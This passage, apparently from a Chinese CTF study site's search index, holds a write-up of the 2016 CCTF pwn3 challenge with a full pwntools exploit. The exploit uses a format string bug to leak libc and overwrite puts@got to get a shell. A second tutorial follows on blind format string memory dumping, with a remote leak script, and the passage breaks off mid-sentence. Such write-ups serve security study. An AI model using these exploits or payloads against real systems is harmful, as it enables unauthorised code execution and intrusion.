\u4fdd\u62a4\u60c5\u51b5 \u00b6 32 \u4f4d\u52a8\u6001\u94fe\u63a5\uff1b\u6253\u5f00 NX \uff1bRELRO \u90e8\u5206\u4fdd\u62a4\uff0c\u53ef\u4ee5\u6539 GOT \u8868\u5730\u5740 Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE ( 0x8048000 ) \u6f0f\u6d1e\u51fd\u6570 \u00b6 \u7a0b\u5e8f\u5b9e\u73b0\u7684\u8f93\u51fa\u529f\u80fd\u5b58\u5728\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u3002\u51fd\u6570\u5c06\u5185\u5bb9\u5199\u5165\u5230 dest \u4e2d\uff0c\u5728\u7528 printf \u8f93\u51fa\uff0c\u800c dest \u5185\u5bb9\u662f\u53ef\u63a7\u7684\u3002 int get_file () { char dest ; // [esp+1Ch] [ebp-FCh] char s1 ; // [esp+E4h] [ebp-34h] char * i ; // [esp+10Ch] [ebp-Ch] printf ( \"enter the file name you want to get:\" ); __isoc99_scanf ( \"%40s\" , & s1 ); if ( ! strncmp ( & s1 , \"flag\" , 4u ) ) puts ( \"too young, too simple\" ); for ( i = ( char * ) file_head ; i ; i = ( char * ) * (( _DWORD * ) i + 60 ) ) { if ( ! strcmp ( i , & s1 ) ) { strcpy ( & dest , i + 40 ); return printf ( & dest ); //\u683c\u5f0f\u5316\u5b57\u7b26\u4e32 } } return printf ( & dest ); //\u683c\u5f0f\u5316\u5b57\u7b26\u4e32 } \u601d\u8def \u00b6 \u6574\u4f53\u653b\u51fb\u5de5\u7a0b\uff1a \u7ed5\u8fc7\u5bc6\u7801 \u786e\u5b9a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u53c2\u6570\u504f\u79fb \u5229\u7528 put@got \u83b7\u53d6 put \u51fd\u6570\u5730\u5740\uff0c\u8fdb\u800c\u83b7\u53d6\u5bf9\u5e94\u7684 libc.so \u7684\u7248\u672c\uff0c\u8fdb\u800c\u83b7\u53d6\u5bf9\u5e94 system \u51fd\u6570\u5730\u5740\u3002 \u4fee\u6539 puts@got \u7684\u5185\u5bb9\u4e3a system \u7684\u5730\u5740\u3002 \u5f53\u7a0b\u5e8f\u518d\u6b21\u6267\u884c puts \u51fd\u6570\u7684\u65f6\u5019\uff0c\u5176\u5b9e\u6267\u884c\u7684\u662f system \u51fd\u6570\u3002 \u7ed5\u8fc7\u5bc6\u7801 \u00b6 \u7b80\u5355\u79fb\u4f4d\u5bc6\u7801\uff0c\u79fb\u52a8\u4f4d\u6570\u662f 1 \u3002\u5bc6\u6587\u662f\uff1a sysbdmin \uff0c\u5bf9\u5e94\u660e\u6587\u662f\uff1a rxraclhm \u3002 __isoc99_scanf ( \"%40s\" , src ); for ( i = 0 ; i <= 39 && src [ i ]; ++ i ) ++ src [ i ]; \u786e\u5b9a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u53c2\u6570\u504f\u79fb \u00b6 \u6211\u8fd8\u662f\u4f7f\u7528\u81ea\u5df1\u719f\u6089\u7684\u65b9\u6cd5\u6cc4\u9732\u51fa\u5730\u5740\uff08\u5199\u4e00\u5806%p\uff09\uff0c\u61d2\u5f97\u8ba1\u7b97\uff0c\u504f\u79fb\u4e3a 7 \uff1a \u6cc4\u9732 libc \u5730\u5740 \u00b6 content \u662f\u5b58\u5728\u5806\u4e2d\u7684\uff0c\u4e0d\u662f\u6808\u4e0a\u7684\uff0c\u4e5f\u5c31\u641e\u4e0d\u5230\u6808\u4e0a\u7684 libc \u51fd\u6570\u5730\u5740\uff0c\u4f46\u662f\u5806\u4e2d\u5185\u5bb9\u662f\u53ef\u63a7\u7684\uff0c\u6211\u4eec\u53ef\u4ee5\u5f80\u91cc\u9762\u5199\u5165 libc \u51fd\u6570\u5730\u5740\uff0c\u7136\u540e\u5728\u8bfb\u51fa\u6765\u5c31\u884c\u4e86\u3002 payload = \"%8$s\" + p32 ( puts_got ) creat ( 'aaaa' , payload ) show ( 'aaaa' ) puts_leak = u32 ( p . recv ( 4 )) \u4fee\u6539 got \u8868 \u00b6 \u4fee\u6539\u8fd8\u662f\u7528\u7684 \u683c\u5f0f\u5316\u5b57\u7b26\u4e32 \uff0c\u9700\u8981\u505a\u7684\u5c31\u662f\u5c06 payload \u5199\u5165\u5230\u5806\u4e2d\uff0c\u7136\u540e\u7528\u7a0b\u5e8f\u7684 get \u529f\u80fd\u89e6\u53d1\u6f0f\u6d1e\u3002payload \u7684\u8bdd\u53ef\u4ee5\u7528 pwntools \u5de5\u5177\u6784\u5efa\uff0c32 \u4f4d\u7684\u95ee\u9898\u4e0d\u5927\uff0c64 \u4f4d\u7684\u8bdd\u6211\u9009\u62e9\u624b\u52a8\u3002 \u8986\u76d6\u65b9\u5f0f\u591a\u79cd\u591a\u6837\u4e86\uff0c\u4e0b\u9762\u7684\u662f\u6700\u540e\u5b9e\u73b0\u8c03\u7528 system('/bin/sh') \uff1a payload = fmtstr_payload ( 7 , { puts_got : system }) creat ( '/bin/sh;' , payload ) # write 2 chunk show ( '/bin/sh;' ) # overwrite puts@got 2 system@got showlist () # getshell \u8fd9\u4e2a\u5806\u540d\u8981\u662f /binsh; \uff0c/bin/sh \u7684\u8bdd\u662f showlist \u65f6\u4f5c\u4e3a system \u53c2\u6570\u3002 ; \u662f\u7528\u6765\u5206\u5272\u524d\u9762\u6211\u4eec\u7528\u6765\u6cc4\u9732\u5730\u5740\u7684\u5806\u540d\uff0c\u5982\u679c\u4e0d\u52a0\u6700\u540e\u6784\u9020\u51fa\u6765\u662f\uff1a system('/bin/shaaaa') \u53e6\u5916\u4e00\u79cd\u586b\u5145\u65b9\u5f0f\u5c31\u662f\uff1a\u5c06 puts@got \u586b\u5145\u4e3a onegadget \uff0c\u8fd9\u6837\u5c31\u4e0d\u9700\u8981\u5bf9\u5806\u540d\u6709\u8981\u6c42\u4e86\u3002 payload = fmtstr_payload ( 7 , { puts_got : onegadget }) creat ( 'bbbb' , payload ) show ( 'bbbb' ) exp \u00b6 #!/usr/bin/env python # -*- coding: utf-8 -*- # @Author : MrSkYe # @Email : skye231@foxmail.com # @File : pwn3.py from pwn import * context.log_level = 'debug' p = process(\"./pwn3\") elf = ELF(\"./pwn3\") libc = ELF(\"./libc.so\") def creat(name,content): p.recvuntil(\"ftp>\") p.sendline(\"put\") p.recvuntil(\"upload:\") p.sendline(name) p.recvuntil(\"content:\") p.sendline(content) def show(name): p.recvuntil(\"ftp>\") p.sendline(\"get\") p.recvuntil(\"get:\") p.sendline(name) def showlist(): p.recvuntil(\"ftp>\") p.sendline(\"dir\") name = \"rxraclhm\" puts_got = elf.got['puts'] log.info(\"puts_got:\"+hex(puts_got)) p.recvuntil(\"Rainism):\") p.sendline(name) # leak libc payload = \"%8$s\" + p32(puts_got) creat('aaaa',payload) show('aaaa') puts_leak = u32(p.recv(4)) log.info(\"puts_leak:\"+hex(puts_leak)) libc_base = puts_leak - libc.symbols['puts'] log.info(\"libc_base:\"+hex(libc_base)) system = libc_base + libc.symbols['system'] log.info(\"system:\"+hex(system)) binsh = libc_base + libc.search('/bin/sh').next() log.info(\"binsh:\"+hex(binsh)) onegadget = libc_base + 0x3ac62 log.info(\"onegadget:\"+hex(onegadget)) # 1:overcover puts@got 2 system@got #payload = fmtstr_payload(7, {puts_got: system}) #creat('/bin/sh;', payload) #show('/bin/sh;') #showlist() # 2:overcover puts@got 2 onegadget payload = fmtstr_payload(7, {puts_got: onegadget}) creat('bbbb', payload) show('bbbb') p.interactive()","title":"2016 CCTF pwn3 writeup"},{"location":"Pwn/fmtstr/fmtstr_example/hijack_GOT/2016_CCTF_pwn3_writeup/#2016-cctf-pwn3","text":"\u8003\u70b9\uff1a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u3001hijack GOT\u3001\u5806","title":"2016 CCTF pwn3"},{"location":"Pwn/fmtstr/fmtstr_example/hijack_GOT/2016_CCTF_pwn3_writeup/#_1","text":"","title":"\u5206\u6790"},{"location":"Pwn/fmtstr/fmtstr_example/hijack_GOT/2016_CCTF_pwn3_writeup/#_2","text":"32 \u4f4d\u52a8\u6001\u94fe\u63a5\uff1b\u6253\u5f00 NX \uff1bRELRO \u90e8\u5206\u4fdd\u62a4\uff0c\u53ef\u4ee5\u6539 GOT \u8868\u5730\u5740 Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE ( 0x8048000 )","title":"\u4fdd\u62a4\u60c5\u51b5"},{"location":"Pwn/fmtstr/fmtstr_example/hijack_GOT/2016_CCTF_pwn3_writeup/#_3","text":"\u7a0b\u5e8f\u5b9e\u73b0\u7684\u8f93\u51fa\u529f\u80fd\u5b58\u5728\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u3002\u51fd\u6570\u5c06\u5185\u5bb9\u5199\u5165\u5230 dest \u4e2d\uff0c\u5728\u7528 printf \u8f93\u51fa\uff0c\u800c dest \u5185\u5bb9\u662f\u53ef\u63a7\u7684\u3002 int get_file () { char dest ; // [esp+1Ch] [ebp-FCh] char s1 ; // [esp+E4h] [ebp-34h] char * i ; // [esp+10Ch] [ebp-Ch] printf ( \"enter the file name you want to get:\" ); __isoc99_scanf ( \"%40s\" , & s1 ); if ( ! strncmp ( & s1 , \"flag\" , 4u ) ) puts ( \"too young, too simple\" ); for ( i = ( char * ) file_head ; i ; i = ( char * ) * (( _DWORD * ) i + 60 ) ) { if ( ! strcmp ( i , & s1 ) ) { strcpy ( & dest , i + 40 ); return printf ( & dest ); //\u683c\u5f0f\u5316\u5b57\u7b26\u4e32 } } return printf ( & dest ); //\u683c\u5f0f\u5316\u5b57\u7b26\u4e32 }","title":"\u6f0f\u6d1e\u51fd\u6570"},{"location":"Pwn/fmtstr/fmtstr_example/hijack_GOT/2016_CCTF_pwn3_writeup/#_4","text":"\u6574\u4f53\u653b\u51fb\u5de5\u7a0b\uff1a \u7ed5\u8fc7\u5bc6\u7801 \u786e\u5b9a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u53c2\u6570\u504f\u79fb \u5229\u7528 put@got \u83b7\u53d6 put \u51fd\u6570\u5730\u5740\uff0c\u8fdb\u800c\u83b7\u53d6\u5bf9\u5e94\u7684 libc.so \u7684\u7248\u672c\uff0c\u8fdb\u800c\u83b7\u53d6\u5bf9\u5e94 system \u51fd\u6570\u5730\u5740\u3002 \u4fee\u6539 puts@got \u7684\u5185\u5bb9\u4e3a system \u7684\u5730\u5740\u3002 \u5f53\u7a0b\u5e8f\u518d\u6b21\u6267\u884c puts \u51fd\u6570\u7684\u65f6\u5019\uff0c\u5176\u5b9e\u6267\u884c\u7684\u662f system \u51fd\u6570\u3002","title":"\u601d\u8def"},{"location":"Pwn/fmtstr/fmtstr_example/hijack_GOT/2016_CCTF_pwn3_writeup/#_5","text":"\u7b80\u5355\u79fb\u4f4d\u5bc6\u7801\uff0c\u79fb\u52a8\u4f4d\u6570\u662f 1 \u3002\u5bc6\u6587\u662f\uff1a sysbdmin \uff0c\u5bf9\u5e94\u660e\u6587\u662f\uff1a rxraclhm \u3002 __isoc99_scanf ( \"%40s\" , src ); for ( i = 0 ; i <= 39 && src [ i ]; ++ i ) ++ src [ i ];","title":"\u7ed5\u8fc7\u5bc6\u7801"},{"location":"Pwn/fmtstr/fmtstr_example/hijack_GOT/2016_CCTF_pwn3_writeup/#_6","text":"\u6211\u8fd8\u662f\u4f7f\u7528\u81ea\u5df1\u719f\u6089\u7684\u65b9\u6cd5\u6cc4\u9732\u51fa\u5730\u5740\uff08\u5199\u4e00\u5806%p\uff09\uff0c\u61d2\u5f97\u8ba1\u7b97\uff0c\u504f\u79fb\u4e3a 7 \uff1a","title":"\u786e\u5b9a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u53c2\u6570\u504f\u79fb"},{"location":"Pwn/fmtstr/fmtstr_example/hijack_GOT/2016_CCTF_pwn3_writeup/#libc","text":"content \u662f\u5b58\u5728\u5806\u4e2d\u7684\uff0c\u4e0d\u662f\u6808\u4e0a\u7684\uff0c\u4e5f\u5c31\u641e\u4e0d\u5230\u6808\u4e0a\u7684 libc \u51fd\u6570\u5730\u5740\uff0c\u4f46\u662f\u5806\u4e2d\u5185\u5bb9\u662f\u53ef\u63a7\u7684\uff0c\u6211\u4eec\u53ef\u4ee5\u5f80\u91cc\u9762\u5199\u5165 libc \u51fd\u6570\u5730\u5740\uff0c\u7136\u540e\u5728\u8bfb\u51fa\u6765\u5c31\u884c\u4e86\u3002 payload = \"%8$s\" + p32 ( puts_got ) creat ( 'aaaa' , payload ) show ( 'aaaa' ) puts_leak = u32 ( p . recv ( 4 ))","title":"\u6cc4\u9732 libc \u5730\u5740"},{"location":"Pwn/fmtstr/fmtstr_example/hijack_GOT/2016_CCTF_pwn3_writeup/#got","text":"\u4fee\u6539\u8fd8\u662f\u7528\u7684 \u683c\u5f0f\u5316\u5b57\u7b26\u4e32 \uff0c\u9700\u8981\u505a\u7684\u5c31\u662f\u5c06 payload \u5199\u5165\u5230\u5806\u4e2d\uff0c\u7136\u540e\u7528\u7a0b\u5e8f\u7684 get \u529f\u80fd\u89e6\u53d1\u6f0f\u6d1e\u3002payload \u7684\u8bdd\u53ef\u4ee5\u7528 pwntools \u5de5\u5177\u6784\u5efa\uff0c32 \u4f4d\u7684\u95ee\u9898\u4e0d\u5927\uff0c64 \u4f4d\u7684\u8bdd\u6211\u9009\u62e9\u624b\u52a8\u3002 \u8986\u76d6\u65b9\u5f0f\u591a\u79cd\u591a\u6837\u4e86\uff0c\u4e0b\u9762\u7684\u662f\u6700\u540e\u5b9e\u73b0\u8c03\u7528 system('/bin/sh') \uff1a payload = fmtstr_payload ( 7 , { puts_got : system }) creat ( '/bin/sh;' , payload ) # write 2 chunk show ( '/bin/sh;' ) # overwrite puts@got 2 system@got showlist () # getshell \u8fd9\u4e2a\u5806\u540d\u8981\u662f /binsh; \uff0c/bin/sh \u7684\u8bdd\u662f showlist \u65f6\u4f5c\u4e3a system \u53c2\u6570\u3002 ; \u662f\u7528\u6765\u5206\u5272\u524d\u9762\u6211\u4eec\u7528\u6765\u6cc4\u9732\u5730\u5740\u7684\u5806\u540d\uff0c\u5982\u679c\u4e0d\u52a0\u6700\u540e\u6784\u9020\u51fa\u6765\u662f\uff1a system('/bin/shaaaa') \u53e6\u5916\u4e00\u79cd\u586b\u5145\u65b9\u5f0f\u5c31\u662f\uff1a\u5c06 puts@got \u586b\u5145\u4e3a onegadget \uff0c\u8fd9\u6837\u5c31\u4e0d\u9700\u8981\u5bf9\u5806\u540d\u6709\u8981\u6c42\u4e86\u3002 payload = fmtstr_payload ( 7 , { puts_got : onegadget }) creat ( 'bbbb' , payload ) show ( 'bbbb' )","title":"\u4fee\u6539 got \u8868"},{"location":"Pwn/fmtstr/fmtstr_example/hijack_GOT/2016_CCTF_pwn3_writeup/#exp","text":"#!/usr/bin/env python # -*- coding: utf-8 -*- # @Author : MrSkYe # @Email : skye231@foxmail.com # @File : pwn3.py from pwn import * context.log_level = 'debug' p = process(\"./pwn3\") elf = ELF(\"./pwn3\") libc = ELF(\"./libc.so\") def creat(name,content): p.recvuntil(\"ftp>\") p.sendline(\"put\") p.recvuntil(\"upload:\") p.sendline(name) p.recvuntil(\"content:\") p.sendline(content) def show(name): p.recvuntil(\"ftp>\") p.sendline(\"get\") p.recvuntil(\"get:\") p.sendline(name) def showlist(): p.recvuntil(\"ftp>\") p.sendline(\"dir\") name = \"rxraclhm\" puts_got = elf.got['puts'] log.info(\"puts_got:\"+hex(puts_got)) p.recvuntil(\"Rainism):\") p.sendline(name) # leak libc payload = \"%8$s\" + p32(puts_got) creat('aaaa',payload) show('aaaa') puts_leak = u32(p.recv(4)) log.info(\"puts_leak:\"+hex(puts_leak)) libc_base = puts_leak - libc.symbols['puts'] log.info(\"libc_base:\"+hex(libc_base)) system = libc_base + libc.symbols['system'] log.info(\"system:\"+hex(system)) binsh = libc_base + libc.search('/bin/sh').next() log.info(\"binsh:\"+hex(binsh)) onegadget = libc_base + 0x3ac62 log.info(\"onegadget:\"+hex(onegadget)) # 1:overcover puts@got 2 system@got #payload = fmtstr_payload(7, {puts_got: system}) #creat('/bin/sh;', payload) #show('/bin/sh;') #showlist() # 2:overcover puts@got 2 onegadget payload = fmtstr_payload(7, {puts_got: onegadget}) creat('bbbb', payload) show('bbbb') p.interactive()","title":"exp"},{"location":"Pwn/fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9B%B2%E6%89%93/Bilnd_Pwn/","text":"Bilnd-\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u76f2\u6253 \u00b6 \u53ef\u80fd\u9700\u8981\u63d0\u524d\u4e86\u89e3\u7684\u77e5\u8bc6 \u00b6 \u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u539f\u7406&\u5229\u7528 got & plt \u8c03\u7528\u5173\u7cfb \u7a0b\u5e8f\u7684\u4e00\u822c\u542f\u52a8\u8fc7\u7a0b \u539f\u7406 \u00b6 \u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u76f2\u6253\u6307\u7684\u662f\u53ea\u7ed9\u51fa\u53ef\u4ea4\u4e92\u7684 ip \u5730\u5740\u4e0e\u7aef\u53e3\uff0c\u4e0d\u7ed9\u51fa\u5bf9\u5e94\u7684 binary \u6587\u4ef6\u6765\u8ba9\u6211\u4eec\u65e0\u6cd5\u901a\u8fc7 IDA \u5206\u6790\uff0c\u5176\u5b9e\u8fd9\u4e2a\u548c BROP \u5dee\u4e0d\u591a\uff0c\u4e0d\u8fc7 BROP \u5229\u7528\u7684\u662f\u6808\u6ea2\u51fa\uff0c\u800c\u8fd9\u91cc\u6211\u4eec\u5229\u7528\u7684\u662f\u65e0\u9650\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\uff0c\u628a\u5728\u5185\u5b58\u4e2d\u7684\u7a0b\u5e8f\u7ed9 dump \u4e0b\u6765\u3002 \u4e00\u822c\u6765\u8bf4\uff0c\u6211\u4eec\u6309\u7167\u5982\u4e0b\u6b65\u9aa4\u8fdb\u884c \u786e\u5b9a\u7a0b\u5e8f\u7684\u4f4d\u6570\uff08\u4e0d\u540c\u4f4d\u6570\u6709\u4e9b\u8bb8\u5dee\u522b\uff09 \u786e\u5b9a\u6f0f\u6d1e\u4f4d\u7f6e \u5229\u7528 \u4f7f\u7528\u6761\u4ef6 \u00b6 \u53ef\u4ee5\u8bfb\u5165 '\\x00' \u5b57\u7b26\u7684 \u8f93\u51fa\u51fd\u6570\u5747\u662f '\\x00' \u622a\u65ad\u7684 \u80fd\u65e0\u9650\u4f7f\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e 32 \u4f4d\u5229\u7528\u624b\u6cd5 \u00b6 \u5b9e\u9a8c\u73af\u5883\u51c6\u5907 \u00b6 \u7a0b\u5e8f\u6e90\u7801\u5982\u4e0b\uff1a #include <stdio.h> #include <string.h> #include <unistd.h> int main ( int argc , char * argv []) { setbuf ( stdin , 0L L ); setbuf ( stdout , 0L L ); setbuf ( stderr , 0L L ); int flag ; char buf [ 1024 ]; FILE * f ; puts ( \"What's your name?\" ); fgets ( buf , 1024 , stdin ); printf ( \"Hi, \" ); printf ( \"%s\" , buf ); putchar ( '\\n' ); flag = 1 ; while ( flag == 1 ){ puts ( \"Do you want the flag?\" ); memset ( buf , '\\0' , 1024 ); read ( STDIN_FILENO , buf , 100 ); if ( ! strcmp ( buf , \"no \\n \" )){ printf ( \"I see. Good bye.\" ); return 0 ; } else { printf ( \"Your input isn't right:\" ); printf ( buf ); printf ( \"Please Try again! \\n \" ); } fflush ( stdout ); } return 0 ; } \u7f16\u8bd1 32 \u4f4d\u6587\u4ef6\uff1a gcc -z execstack -fno-stack-protector -m32 -o leakmemory leakmemory.c \u7528 socat \u6302\u5230\u7aef\u53e3 10001 \u4e0a\u90e8\u7f72\uff1a socat TCP4-LISTEN:10001,fork EXEC:./leakmemory \u5b9e\u9a8c\u73af\u5883\u5b8c\u6210\uff0c\u5982\u679c\u662f\u672c\u5730\u90e8\u7f72\u7684\u8bdd\uff0c\u7b49\u7b49\u5728 exp \u91cc\u9762\u5199 remote(\"127.0.0.1\",10001) \u6a21\u62df\u6ca1\u6709 binary \u7684\u8fdc\u7a0b\u76f2\u6253\u60c5\u51b5\u3002 \u786e\u5b9a\u7a0b\u5e8f\u7684\u4f4d\u6570 \u00b6 \u7528 %p \u770b\u770b\u7a0b\u5e8f\u56de\u663e\u8f93\u51fa\u7684\u957f\u5ea6\u662f\u591a\u5c11\uff0c\u4ee5\u6b64\u5224\u65ad\u7a0b\u5e8f\u7684\u4f4d\u6570\u3002\u8fd9\u91cc\u770b\u5230\u56de\u663e\u662f 4 \u4e2a\u5b57\u8282\uff0c\u5224\u65ad\u662f 32 \u4f4d\u7a0b\u5e8f\u3002\u53ef\u4ee5\u518d\u591a\u6cc4\u9732\u51e0\u4e2a\uff0c\u90fd\u662f 4 \u5b57\u8282\uff08\u542b\uff09\u4ee5\u4e0b\u7684\uff0c\u786e\u5b9a\u4e3a 32 \u4f4d\u7a0b\u5e8f\u3002 \u786e\u5b9a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u504f\u79fb \u00b6 \u627e\u5230\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u504f\u79fb\u662f\u591a\u5c11\uff0c\u5728\u540e\u7eed\u64cd\u4f5c\u4e2d\u4f1a\u7528\u5230\u3002\u7531\u4e8e\u6ca1\u6709 binary \u4e0d\u80fd\u901a\u8fc7\u8c03\u8bd5\u5206\u6790\u504f\u79fb\uff0c\u5c31\u91c7\u53d6\u8f93\u5165\u591a\u4e2a %p \u6cc4\u9732\u51fa\u504f\u79fb\u3002\u4e3a\u4e86\u5bb9\u6613\u8fa8\u8ba4\uff0c\u5b57\u7b26\u4e32\u5f00\u59cb\u5148\u586b\u5145 4 \u5b57\u8282 \u7684\u586b\u5145\uff0864\u4f4d8\u5b57\u8282\uff09\uff0c\u7136\u540e\u518d\u586b\u5165 %p \u3002 \u6700\u540e\u786e\u8ba4\u504f\u79fb\u4e3a 7 \u3002 dump \u7a0b\u5e8f \u00b6 dump \u7a0b\u5e8f\u5e94\u8be5\u9009\u54ea\u4e2a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\uff1a %n$s \uff1a\u5c06\u7b2c n \u4e2a\u53c2\u6570\u7684\u503c\u4f5c\u4e3a\u5730\u5740\uff0c\u8f93\u51fa\u8fd9\u4e2a\u5730\u5740\u6307\u5411\u7684\u5b57\u7b26\u4e32\u5185\u5bb9 %n$p \uff1a\u5c06\u7b2c n \u4e2a\u53c2\u6570\u7684\u503c\u4f5c\u4e3a\u5185\u5bb9\uff0c\u4ee5\u5341\u516d\u8fdb\u5236\u5f62\u5f0f\u8f93\u51fa \u6211\u4eec\u662f\u9700\u8981 dump \u7a0b\u5e8f\uff0c\u4e5f\u5c31\u662f\u60f3\u83b7\u53d6\u6211\u4eec\u6240\u7ed9\u5b9a\u5730\u5740\u7684\u5185\u5bb9\uff0c\u800c\u4e0d\u662f\u83b7\u53d6\u6211\u4eec\u7ed9\u5b9a\u7684\u5730\u5740\u3002\u6240\u4ee5\u5e94\u8be5\u7528 %n$s \u628a\u6211\u4eec\u7ed9\u5b9a\u5730\u5740\u5f53\u4f5c\u6307\u9488\uff0c\u8f93\u51fa\u7ed9\u5b9a\u5730\u5740\u6240\u6307\u5411\u7684\u5b57\u7b26\u4e32\u3002\u7ed3\u5408\u524d\u9762\u77e5\u9053\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u504f\u79fb\u4e3a 7 \uff0cpayload \u5e94\u8be5\u4e3a\uff1a %9$s.TMP[addr] \u3002 \u6ce8\u610f \uff1a\u4f7f\u7528 %s \u8fdb\u884c\u8f93\u51fa\u5e76\u4e0d\u662f\u4e00\u4e2a\u5b57\u8282\u4e00\u4e2a\u5b57\u8282\u8f93\u51fa\uff0c\u800c\u662f\u4e00\u76f4\u8f93\u51fa\u76f4\u5230\u9047\u5230 \\x00 \u622a\u6b62\u7b26\u624d\u4f1a\u505c\u6b62\uff0c\u4e5f\u5c31\u662f\u6bcf\u6b21\u6cc4\u9732\u7684\u957f\u5ea6\u662f\u4e0d\u786e\u5b9a\u7684\uff0c\u53ef\u80fd\u5f88\u957f\u4e5f\u53ef\u80fd\u662f\u7a7a\u3002\u56e0\u4e3a .text \u6bb5\u5f88\u53ef\u80fd\u6709\u8fde\u7eed \\x00 \uff0c\u6240\u4ee5\u6cc4\u9732\u811a\u672c\u5904\u7406\u60c5\u51b5\u6709\uff1a \u9488\u5bf9\u6bcf\u6b21\u6cc4\u9732\u957f\u5ea6\u4e0d\u7b49\uff0caddr \u6839\u636e\u6bcf\u6b21\u6cc4\u9732\u957f\u5ea6\u52a8\u6001\u589e\u52a0\uff1b \u6cc4\u9732\u5b57\u7b26\u4e32\u53ef\u80fd\u4e3a\u7a7a\uff0c\u4e5f\u5c31\u662f\u5982\u4f55\u5904\u7406 \\x00 \uff1b \u9664\u6b64\u4e4b\u5916\uff0c\u8fd8\u6709\u4e00\u4e2a\u95ee\u9898\u662f\u6cc4\u9732\u7684\u8d77\u59cb\u5730\u5740\u5728\u54ea\u91cc\uff1f\u4ece\u5404\u4e2a\u5927\u4f6c\u6587\u7ae0\u5b66\u5230\u4e24\u79cd\u505a\u6cd5\uff1a\u4ece .text \u6bb5\u5f00\u59cb\uff1b\u4ece\u7a0b\u5e8f\u52a0\u8f7d\u5730\u65b9\u5f00\u59cb\uff1b\u4e24\u79cd\u65b9\u6cd5\u6cc4\u9732\u51fa\u6765\u7a0b\u5e8f\uff0c\u5728 ida \u4e2d\u5448\u73b0\u6709\u5dee\u522b\u3002 \u4ece\u7a0b\u5e8f\u52a0\u8f7d\u5730\u65b9\u5f00\u59cb \u00b6 \u5148\u6765\u8bf4\u7701\u4e8b\u7684\uff0c \u4ece\u7a0b\u5e8f\u52a0\u8f7d\u5730\u65b9\u5f00\u59cb \u3002\u7a0b\u5e8f\u52a0\u8f7d\u5730\u65b9 32 \u4f4d\u548c 64 \u4f4d\u5404\u4e0d\u76f8\u540c\uff1a 32 \u4f4d\uff1a\u4ece 0x8048000 \u5f00\u59cb\u6cc4\u9732 64 \u4f4d\uff1a\u4ece 0x400000 \u5f00\u59cb\u6cc4\u9732 \u4e0b\u9762\u662f\u8fd9\u6761\u4f8b\u9898\u7684\u6cc4\u9732\u811a\u672c\uff0c\u7ed3\u5408\u6ce8\u89e3\u5206\u6790\u5982\u4f55\u5904\u7406\u4e0a\u9762\u63d0\u5230\u7684\u95ee\u9898\uff1a #! /usr/bin/env python # -*- coding: utf-8 -*- from pwn import * import binascii r = remote ( '127.0.0.1' , 10001 ) def leak ( addr ): payload = \"%9$s.TMP\" + p32 ( addr ) r . sendline ( payload ) print \"leaking:\" , hex ( addr ) r . recvuntil ( 'right:' ) ret = r . recvuntil ( \".TMP\" , drop = True ) print \"ret:\" , binascii . hexlify ( ret ), len ( ret ) remain = r . recvrepeat ( 0.2 ) return ret # name r . recv () r . sendline ( 'nameaaa' ) r . recv () # leak begin = 0x8048000 text_seg = '' try : while True : ret = leak ( begin ) text_seg += ret begin += len ( ret ) if len ( ret ) == 0 : # nil begin += 1 text_seg += ' \\x00 ' except Exception as e : print e finally : print '[+]' , len ( text_seg ) with open ( 'dump_bin' , 'wb' ) as f : f . write ( text_seg ) \u6ce8\u89e3 \uff1a 19-21 \u884c\uff1a\u5904\u7406\u65e0\u5173\u6cc4\u9732\u7684\u7a0b\u5e8f\u6d41\u7a0b\u540e\uff0c\u8fdb\u5165\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u8f93\u5165\u72b6\u6001 24 \u884c\uff1a32 \u4f4d\u7cfb\u7edf\u52a0\u8f7d\u5730\u5740 9 \u884c\uff1a\"%9$s.TMP\" \u4e2d\u7684 .TMP \u65e2\u662f\u586b\u5145\u5bf9\u9f50\uff0c\u4e5f\u662f\u5206\u9694\u7b26\uff0c\u65b9\u4fbf\u540e\u9762\u5904\u7406\u6570\u636e 14 \u884c\uff1a\u4f7f\u7528binascii \u5c06\u6cc4\u6f0f\u51fa\u6765\u5b57\u7b26\u4e32\u6bcf\u4e00\u4e2a\u90fd\u4ece ascii \u8f6c\u6362\u4e3a \u5341\u516d\u8fdb\u5236\uff0c\u65b9\u4fbf\u663e\u793a 15 \u884c\uff1ar.recvrepeat(0.2) \u63a5\u53d7\u8fd4\u56de\u7684\u5783\u573e\u6570\u636e\uff0c\u65b9\u4fbf\u4e0b\u4e00\u8f6e\u7684\u8f93\u5165 30 \u884c\uff1a\u6cc4\u6f0f\u5730\u5740\u52a8\u6001\u589e\u52a0\uff0c\u5047\u5982\u6cc4\u6f0f 1 \u5b57\u8282\u5c31\u589e\u52a0 1 \uff1b\u6cc4\u6f0f 3 \u5b57\u8282\u5c31\u589e\u52a0 3 31-33 \u884c\uff1a\u5904\u7406\u6cc4\u6f0f\u957f\u5ea6\u4e3a 0 \uff0c\u4e5f\u5c31\u662f\u6570\u636e\u662f \\x00 \u7684\u60c5\u51b5\u3002\u5730\u5740\u589e\u52a0 1 \uff0c\u7a0b\u5e8f\u6570\u636e\u52a0 \\x00 \u8fd0\u884c\u4e4b\u540e\uff0c\u8010\u5fc3\u7b49\u5f85\u6cc4\u6f0f\u5b8c\u6210\u3002\u6cc4\u6f0f\u51fa\u6765\u7684\u7a0b\u5e8f\u662f\u4e0d\u80fd\u8fd0\u884c\u7684\uff0c\u4f46\u53ef\u4ee5\u5728 ida 